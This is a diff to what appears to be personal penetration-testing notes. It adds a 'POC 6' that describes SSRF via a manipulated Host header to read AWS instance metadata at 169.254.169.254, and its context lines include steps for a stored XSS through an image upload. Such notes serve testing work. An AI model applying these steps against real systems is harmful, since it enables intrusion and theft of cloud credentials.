@@ -15,6 +15,7 @@
 | [POC 3](#POC-3) | Xss + WAF bypass |
 | [POC 4](#POC-4) | Email Verify Bypass |
 | [POC 5](#POC-5) | Image Upload com XSS Interno |
+| [POC 6](#POC-6) | SSRF Access AWS Metadata |
 
 ---
 <br>
@@ -90,5 +91,17 @@ upload de imagem com xss interno -->
 content typ de image/png para text/html no intercept (não repeater) -->
 inspect element e abra em outra aba -->
 link url do stored xss
+```
+<br>
+
+## **POC 6**
+<br>
+
+**SSRF via Misconfigured Host Header | Access AWS Metadata**
+```bash
+capturar a tela de login no burp -->
+GET /login -->
+alterar o host para 169.254.169.254 -->
+alterar o get para GET https://169.254.169.254/latest/meta-data/
 ```
 <br>
